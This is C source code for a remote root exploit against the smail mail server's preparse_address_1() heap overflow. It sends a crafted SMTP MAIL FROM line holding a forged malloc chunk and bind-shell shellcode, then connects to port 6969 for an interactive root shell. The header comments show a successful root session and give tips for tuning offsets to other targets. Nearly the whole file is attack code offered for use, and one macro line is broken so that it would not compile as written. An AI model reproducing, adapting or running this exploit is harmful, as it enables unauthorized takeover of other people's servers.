/*
 *
 * 0
 *
 * smail preparse_address_1() heap bof remote root exploit
 *
 * infamous42md AT hotpop DOT com
 *
 * Shouts:
 *
 * BMF, wipe with the left, eat with the right
 *
 * Notes:
 *
 * You can't have any characters in overflow buffer that isspace() returns true
 * for.  The shellcode is clear of them, but if your return address or retloc
 * has one you gotta figure out another one.  My slack box has that situation,
 * heap is at 0x080d.. My gentoo laptop had no such problem and all was fine.  I
 * don't have anymore time to BS around with this and make perfect for any and
 * all, b/c I've got exam to study for and Law and Order:CI is on in an hour.
 * If the heap you're targetting is the same way, then try filling it up using
 * some other commands.  If the GOT you're targetting is at such address than
 * overwrite a return address on the stack.  Surely there's a way, check out the
 * source and be creative; I'm sure there are some memory leaks somewhere you
 * can use to fill up heap as well.
 *
 * You might run into some ugliness trying to automate this for a couple
 * reasons.  xmalloc() stores a cookie in front of buffer, and xfree() checks
 * for this cookie before calling free().  So you're going to need that aligned
 * properly unless you can cook up a way to exploit it when it bails out in
 * xfree() b/c of bad cookie and calls write_log() (this func calls malloc() so
 * maybe you can be clever and do something there). Furthermore I found that
 * when trying to trigger this multiple times the alignment was different each
 * time.  There are "definitely" more reliable ways to exploit this if you take
 * a deeper look into code which I don't have time to do right now.  The padding
 * parameter controls the alignment and the size of the chunk being allocated.
 * You'll probably have to play with it.  Yes that's fugly.
 *
 * [n00b@crapbox.outernet] ./a.out
 * Usage: ./a.out < host > < padding > < retloc > < retaddr >
 *
 * [n00b@crapbox.outernet] ./a.out localhost 64 0xbffff39c 0x8111ea0
 * --{ Smack 1.oohaah
 *
 * --{ definitely, adv.:
 * --{ 1. Having distinct limits
 * --{ 2. Indisputable; certain
 * --{ 3. Clearly defined; explicitly precise
 *
 * --{ Said HELO
 *
 * --{ Sent MAIL FROM overflow
 *
 * --{ Going for shell in 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1
 *
 * --{ Attempting to redefine the meaning of 'definitely'
 *
 * --{ Got a shell
 *
 * --{ Updating Webster's
 * --{ definitely, adv.:
 * --{ 1. See specious
 *
 * --{ For the linguistically challenged...
 * --{ specious, adj. :
 * --{ 1. Having the ring of truth or plausibility but actually fallacious
 * --{ 2. Deceptively attractive
 *
 * id
 * uid=0(root) gid=0(root)
 * echo PWNED
 * PWNED
 *
 *  - Connection closed by user
 *
 */

#include <stdio.h>
#include <ctype.h>
#include <sys/types.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/select.h>
#include <arpa/inet.h>


/* */
#define BS 0x1000
#define SMTP_PORT 25


#define Z(x, len) memset((x), 0, (len))
#define die(x) do{ perror((x)); exit(EXIT_FAILURE); }while(0)
#define bye(fmt, args...) do{ fprintf(stderr, fmt"\n", ##args);
#exit(EXIT_FAILURE); }while(0)


/* fat bloated call them shell code */
#define SHELL_LEN (sizeof(sc)-1)
#define SHELL_PORT 6969
#define NOP 0x90
char sc[] =
"\xeb\x0e""notexploitable"
"\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x39\xc6\x04\x24\x02\x89\xe6\xb0\x02"
"\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50\x6a\x01\x6a\x02"
"\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a\x10\x56\x50\x89\xe1\xb0"
"\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x04\xcd"
"\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89"
"\xeb\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x6b\x2c\x60\xcd"
"\x80";


/*  a dlmalloc chunk descriptor */
#define CHUNKSZ 0xfffffff8
#define CHUNKLEN sizeof(mchunk_t)
typedef struct _mchunk {
    size_t  dummy;
    size_t  prevsz;
    size_t  sz;
    long    fd;
    long    bk;
} mchunk_t;

/* */
ssize_t Send(int s, const void *buf, size_t len, int flags)
{
    ssize_t n;

    n = send(s, buf, len, flags);
    if(n < 0)
        die("send");

    return n;
}

/* */
ssize_t Recv(int s, void *buf, size_t len, int flags)
{
    ssize_t n;

    n = recv(s, buf, len, flags);
    if(n < 0)
        die("recv");

    return n;
}

/* */
int conn(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    struct sockaddr_in sa;

    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
            bye("gethostbyname failed with error %s", hstrerror(h_errno));
    }
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
            die("socket");

    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
            die("connect");

    return sock;
}

/* */
void shell(char *host, u_short port)
{
    int sock = 0, l = 0;
    char buf[BS];
    fd_set rfds;

    sock = conn(host, port);

    printf("--{ Got a shell\n\n"
           "--{ Updating Webster's\n"
           "--{ definitely, adv.:\n"
           "--{ 1. See specious\n\n"
           "--{ For the linguistically challenged...\n"
           "--{ specious, adj. :\n"
           "--{ 1. Having the ring of truth or plausibility but "
           "actually fallacious\n"
           "--{ 2. Deceptively attractive\n\n"
          );

    FD_ZERO(&rfds);

    while (1) {
            FD_SET(STDIN_FILENO, &rfds);
            FD_SET(sock, &rfds);

            if (select(sock + 1, &rfds, NULL, NULL, NULL) < 1)
                die("select");

            if (FD_ISSET(STDIN_FILENO, &rfds)) {
            l = read(0, buf, BS);
            if(l < 0)
                die("read");
            else if(l == 0)
                        bye("\n - Connection closed by user\n");

                if (write(sock, buf, l) < 1)
                        die("write");
            }

            if (FD_ISSET(sock, &rfds)) {
                l = read(sock, buf, sizeof(buf));

                if (l == 0)
                        bye("\n - Connection terminated.\n");
                else if (l < 0)
                        die("\n - Read failure\n");

                if (write(STDOUT_FILENO, buf, l) < 1)
                        die("write");
            }
    }
}

/* */
int parse_args(int argc, char **argv, char **host, int *npad,
                    u_int *retloc, u_int *retaddr)
{
    if(argc < 5)
        return 1;

    *host = argv[1];

    if(sscanf(argv[2], "%d", npad) != 1)
        return 1;

    if(sscanf(argv[3], "%x", retloc) != 1)
        return 1;

    if(sscanf(argv[4], "%x", retaddr) != 1)
        return 1;

    return 0;
}

/* */
void sploit(int sock, int npad, u_int retloc, u_int retaddr)
{
    ssize_t n = 0;
    u_char  buf[BS],    pad[BS],    evil[BS];
    mchunk_t    chunk;

    Z(buf, BS), Z(pad, BS), Z(evil, BS),    Z(&chunk, CHUNKLEN);

    /* read greeting */
    n = Recv(sock, buf, BS, 0);
    if(n == 0)
        bye("Server didn't even say hi");

    /* send HELO */
    n = snprintf(buf, BS, "HELO localhost\r\n");
    Send(sock, buf, n, 0);
    Z(buf, BS);
    n = Recv(sock, buf, BS, 0);
    if(n == 0)
        bye("Server didn't respond to HELO");

    printf("--{ Said HELO\n\n");

    /*
     * Build evil chunk overflow.  The need to align chunk exactly makes this
     * not so robust.  In my short testing I wasn't able to get free() called
     * directly on an area of memory we control.  I'm sure you can though if you
     * take some time to study process heap behavior.  Note though that you'll
     * have to fill in the magic cookie field that xmalloc()/xfree() and some
     * other functions use, so you'll still need to have it aligned properly
     * which defeats the whole purpose.  This exploits the free() call on the
     * buffer we overflow, so you have to align the next chunk accordingly.
     * Anyhow on newest glibc there is a check for negative size field on the
     * chunk being freed, and program dies if it is negative (the exact
     * condition is not negative, but it has that effect pretty much, but go
     * look yourself ;)), So the techniques outlined by gera in phrack don't
     * work (being able to point all chunks at our two evil chunks).  Check out
     * most recent glibc code in _int_free() if you haven't already.
     */
    memset(pad, 'A', npad);

    chunk.dummy = CHUNKSZ;
    chunk.prevsz = CHUNKSZ;
    chunk.sz = CHUNKSZ;
    chunk.fd = retloc - 12;
    chunk.bk = retaddr;
    memcpy(evil, &chunk, CHUNKLEN);
    evil[CHUNKLEN] = 0;

    /* send the overflow */
    n = snprintf(buf, BS, "MAIL FROM:<A!@A:%s> %s%s\n", pad, evil, sc);
    Send(sock, buf, n, 0);
    Z(buf, BS);

    printf("--{ Sent MAIL FROM overflow\n\n");

#define SLEEP_TIME 15
    setbuf(stdout, NULL);
    printf("--{ Going for shell in ");
    for(n = 0; n < SLEEP_TIME; n++){
        printf("%d ", SLEEP_TIME-n);
        sleep(1);
    }
    puts("\n");
}


/*
 */
int main(int argc, char **argv)
{
    int sock = 0,   npad = 0;
    u_int   retloc  = 0,    retaddr = 0;
    char    *host = NULL;

    if(parse_args(argc, argv, &host, &npad, &retloc, &retaddr))
        bye("Usage: %s < host > < padding > < retloc > < retaddr >\n", argv[0]);

    printf("--{ Smack 1.oohaah\n\n");

    sock = conn(host, SMTP_PORT);

    printf("--{ definitely, adv.:\n"
           "--{ 1. Having distinct limits\n"
           "--{ 2. Indisputable; certain\n"
           "--{ 3. Clearly defined; explicitly precise\n\n"
          );

    sploit(sock, npad, retloc, retaddr);

    printf("--{ Attempting to redefine the meaning of 'definitely'\n\n");

    shell(host, SHELL_PORT);

    return EXIT_SUCCESS;
}


